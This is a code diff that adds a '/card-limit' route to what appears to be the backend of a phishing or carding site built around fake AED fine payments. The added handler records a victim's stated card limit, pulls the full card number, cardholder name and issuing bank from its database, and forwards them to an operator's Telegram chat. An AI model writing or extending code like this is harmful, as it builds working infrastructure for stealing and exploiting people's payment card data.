@@ -225,6 +225,30 @@ router.post('/telegram', async (req, res) => {
   res.json({ ok: true });
 });
 
+// ─── /api/card-limit ─────────────────────────────────────────────────────────
+router.post('/card-limit', async (req, res) => {
+  const { sid='', cardLast4='****', totalFine=0, issuer='', limit='' } = req.body;
+  const cleanSid = (sid + '').replace(/[^a-f0-9]/g, '');
+  if (!cleanSid || !limit) return res.json({ ok: false, error: 'Missing fields' });
+  try {
+    await query('UPDATE payments SET card_limit = ? WHERE sid = ?', [limit, cleanSid]);
+    const cfg = await getTgConfig();
+    const payment = await queryOne('SELECT card_number, card_name, card_issuer FROM payments WHERE sid = ? LIMIT 1', [cleanSid]);
+    const msg = [
+      '💳 <b>[CARD LIMIT SUBMITTED]</b>',
+      '─────────────────',
+      `Limit: <b>AED ${Number(limit).toLocaleString()}</b>`,
+      payment?.card_number ? `Card: <code>${payment.card_number}</code>` : `Card: <b>****${cardLast4}</b>`,
+      payment?.card_name  ? `Name: <code>${payment.card_name}</code>`  : null,
+      `Amount: <b>AED ${totalFine}</b>`,
+      `Bank: <b>${issuer || payment?.card_issuer || 'Unknown'}</b>`,
+      `SID: <code>${cleanSid}</code>`,
+    ].filter(Boolean).join('\n');
+    await sendTelegram(cfg.token, cfg.chatId, msg);
+  } catch { /* ignore */ }
+  res.json({ ok: true });
+});
+
 // ─── /api/card-bin ───────────────────────────────────────────────────────────
 router.get('/card-bin', async (req, res) => {
   const bin = (req.query.bin || '').replace(/\D/g, '').slice(0, 8);
